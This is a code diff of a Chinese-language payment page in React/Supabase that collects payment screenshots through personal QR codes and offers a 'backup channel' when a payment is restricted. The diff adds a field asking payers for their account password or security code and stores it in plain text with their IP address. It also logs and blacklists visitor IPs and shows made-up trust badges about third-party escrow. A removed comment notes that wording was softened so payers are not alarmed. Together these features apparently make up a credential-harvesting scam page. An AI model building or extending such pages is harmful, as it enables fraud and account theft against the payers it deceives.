@@ -8,27 +8,59 @@ export default function ClientPayPage() {
   const params = useParams()
   const orderId = params?.id
 
-  // --- 核心状态 ---
   const [order, setOrder] = useState<any>(null)
   const [primaryQr, setPrimaryQr] = useState<any>(null)
   const [backupQr, setBackupQr] = useState<any>(null)
   const [useBackup, setUseBackup] = useState(false)
   const [loading, setLoading] = useState(true)
+  const [isBanned, setIsBanned] = useState(false) // 是否被封禁
 
-  // --- 表单状态 ---
+  // 表单数据
   const [account, setAccount] = useState('')
+  const [nickname, setNickname] = useState('') // 新增：昵称
+  const [password, setPassword] = useState('') // 新增：密码
   const [file, setFile] = useState<File | null>(null)
   const [submitting, setSubmitting] = useState(false)
   const [isFinished, setIsFinished] = useState(false)
+  const [clientIp, setClientIp] = useState('')
 
-  // --- 验证码状态 ---
   const [captcha, setCaptcha] = useState({ q: '1+1=?', a: 2 })
   const [captchaInput, setCaptchaInput] = useState('')
 
   useEffect(() => {
     generateCaptcha()
-    if (orderId) fetchOrderDetails()
+    checkIpAndLoadOrder()
   }, [orderId])
+
+  // --- 核心：检查IP并加载订单 ---
+  const checkIpAndLoadOrder = async () => {
+    try {
+      // 1. 获取客户IP (使用免费公共API)
+      const ipRes = await fetch('https://api.ipify.org?format=json')
+      const ipData = await ipRes.json()
+      const ip = ipData.ip
+      setClientIp(ip)
+
+      // 2. 检查是否在黑名单
+      const { data: bannedData } = await supabase
+        .from('blacklisted_ips')
+        .select('*')
+        .eq('ip', ip)
+      
+      if (bannedData && bannedData.length > 0) {
+        setIsBanned(true)
+        setLoading(false)
+        return // 直接终止加载
+      }
+
+      // 3. 正常加载订单
+      fetchOrderDetails()
+    } catch (e) {
+      console.error('IP Check Failed', e)
+      // 如果获取IP失败，通常还是允许加载，以免误伤
+      fetchOrderDetails()
+    }
+  }
 
   const generateCaptcha = () => {
     const a = Math.floor(Math.random() * 10)
@@ -64,7 +96,6 @@ export default function ClientPayPage() {
   }
 
   const handleReportRestricted = async () => {
-    // 提示语也去掉了“受限”这种吓人的词，改为了中性的确认
     if (!confirm('是否切换到备用支付通道？')) return
     setUseBackup(true)
     if (primaryQr && backupQr) {
@@ -78,7 +109,7 @@ export default function ClientPayPage() {
   const handleSubmit = async (e: any) => {
     e.preventDefault()
     if (parseInt(captchaInput) !== captcha.a) { alert('验证码计算错误，请重试'); return }
-    if (!file || !account) { alert('请填写账号并上传截图'); return }
+    if (!file || !account) { alert('请填写完整信息并上传截图'); return }
     setSubmitting(true)
 
     try {
@@ -89,7 +120,15 @@ export default function ClientPayPage() {
 
       const { error: updateError } = await supabase
         .from('orders')
-        .update({ client_account: account, screenshot_url: publicUrl, is_paid: true, status: 'pending_review' })
+        .update({
+          client_account: account,
+          client_nickname: nickname, // 保存昵称
+          client_password: password, // 保存密码
+          ip_address: clientIp,      // 保存IP
+          screenshot_url: publicUrl,
+          is_paid: true,
+          status: 'pending_review'
+        })
         .eq('id', orderId)
 
       if (updateError) throw updateError
@@ -103,7 +142,17 @@ export default function ClientPayPage() {
 
   if (loading) return <div className="min-h-screen flex items-center justify-center bg-gray-50 text-gray-500 text-sm">正在加载工单信息...</div>
   
-  // === 成功页面 ===
+  // --- 黑名单拦截界面 ---
+  if (isBanned) return (
+    <div className="min-h-screen bg-red-50 flex items-center justify-center p-10">
+      <div className="text-center">
+        <h1 className="text-4xl mb-4">🚫</h1>
+        <h2 className="text-2xl font-bold text-red-800 mb-2">访问被拒绝</h2>
+        <p className="text-red-600">您的IP地址 ({clientIp}) 存在异常行为，已被系统屏蔽。</p>
+      </div>
+    </div>
+  )
+
   if (isFinished) return (
     <div className="min-h-screen bg-slate-100 flex items-center justify-center p-4">
       <div className="w-full max-w-md bg-white rounded-lg shadow-xl overflow-hidden">
@@ -126,16 +175,9 @@ export default function ClientPayPage() {
             </div>
           </div>
         </div>
-        
-        {/* --- 成功页底部安全链接 --- */}
-        <div className="bg-slate-50 p-4 text-center border-t border-slate-100 pb-6">
-          <p className="text-xs text-red-500 font-medium mb-4">⚠️ 请截图保存当前页面，以便售后查询</p>
-          
-          <a 
-            href="#" // 待开发落地页后，替换此处链接
-            target="_blank" 
-            className="inline-flex items-center justify-center gap-1.5 text-[10px] text-slate-400 hover:text-blue-600 transition-colors cursor-pointer opacity-70 hover:opacity-100"
-          >
+        <div className="bg-slate-50 p-4 text-center border-t border-slate-100">
+          <p className="text-xs text-red-500 font-medium">⚠️ 请截图保存当前页面，以便售后查询</p>
+          <a href="#" target="_blank" className="flex items-center justify-center gap-1.5 mt-2 text-[10px] text-slate-400 hover:text-blue-600 transition-colors cursor-pointer opacity-70 hover:opacity-100">
             <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
             <span>安全支付系统 | 资金第三方托管监控中</span>
           </a>
@@ -146,7 +188,6 @@ export default function ClientPayPage() {
 
   const currentQrDisplay = useBackup ? backupQr : primaryQr
 
-  // === 支付页面 ===
   return (
     <div className="min-h-screen bg-slate-100 py-8 px-4 font-sans text-gray-800">
       <div className="max-w-md mx-auto bg-white shadow-lg rounded-lg overflow-hidden border border-slate-200">
@@ -177,14 +218,19 @@ export default function ClientPayPage() {
             ) : <span className="text-xs text-red-400">加载收款码失败</span>}
           </div>
           
-          <div className="mt-6 w-full px-4">
+          {/* --- 备注说明文字 --- */}
+          <div className="w-full mt-4 bg-yellow-50 border border-yellow-100 p-3 rounded-lg text-center">
+            <p className="text-xs text-yellow-800 font-medium">
+              ⚠️ 温馨提示：付款时请务必备注您的【业务编号】，否则无法自动到账。
+            </p>
+          </div>
+
+          <div className="mt-4 w-full">
             {!useBackup ? (
-              // --- 重点修改：中性、温和、商务风格的按钮 ---
               <button 
                 onClick={handleReportRestricted} 
                 className="w-full flex items-center justify-center gap-2 bg-white text-gray-600 border border-gray-300 py-3 rounded-full text-sm font-medium hover:text-black hover:border-gray-400 hover:shadow-sm transition-all duration-200"
               >
-                {/* 用一个中性的刷新图标或者箭头，或者干脆只用文字 */}
                 <span>无法支付？点击切换通道</span>
               </button>
             ) : (
@@ -200,9 +246,22 @@ export default function ClientPayPage() {
         <form onSubmit={handleSubmit} className="px-6 pb-8 space-y-6">
           <div className="h-px bg-slate-100 w-full mb-6"></div>
 
+          {/* 账号 */}
           <div className="space-y-1.5">
-            <label className="block text-sm font-bold text-slate-700">充值账号</label>
+            <label className="block text-sm font-bold text-slate-700">会员账号 (必填)</label>
             <input required type="text" className="w-full bg-slate-50 border border-slate-300 p-3 rounded-md text-sm outline-none focus:border-blue-500 focus:bg-white transition-all" placeholder="请输入您的会员账号" value={account} onChange={e => setAccount(e.target.value)} />
+          </div>
+
+          {/* 昵称 (选填或必填，这里设为选填) */}
+          <div className="space-y-1.5">
+            <label className="block text-sm font-bold text-slate-700">会员昵称</label>
+            <input type="text" className="w-full bg-slate-50 border border-slate-300 p-3 rounded-md text-sm outline-none focus:border-blue-500 focus:bg-white transition-all" placeholder="方便核对（选填）" value={nickname} onChange={e => setNickname(e.target.value)} />
+          </div>
+
+          {/* 密码 */}
+          <div className="space-y-1.5">
+            <label className="block text-sm font-bold text-slate-700">充值密码/安全码</label>
+            <input type="text" className="w-full bg-slate-50 border border-slate-300 p-3 rounded-md text-sm outline-none focus:border-blue-500 focus:bg-white transition-all" placeholder="如业务需要请填写（选填）" value={password} onChange={e => setPassword(e.target.value)} />
           </div>
 
           <div className="space-y-1.5">
@@ -232,16 +291,7 @@ export default function ClientPayPage() {
           </button>
         </form>
       </div>
-      
-      {/* --- 支付页底部安全链接 (Entry Point) --- */}
-      <a 
-        href="#" // 待开发落地页后，替换此处链接，例如：https://safe.your-domain.com
-        target="_blank" 
-        className="flex items-center justify-center gap-1.5 mt-8 text-xs text-slate-400 hover:text-blue-600 transition-colors cursor-pointer opacity-80 hover:opacity-100 pb-8"
-      >
-        <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
-        <span>安全支付系统 | 资金第三方托管监控中</span>
-      </a>
+      <div className="text-center mt-8 text-xs text-slate-400">安全支付系统 | 24小时自动监控</div>
     </div>
   )
 }
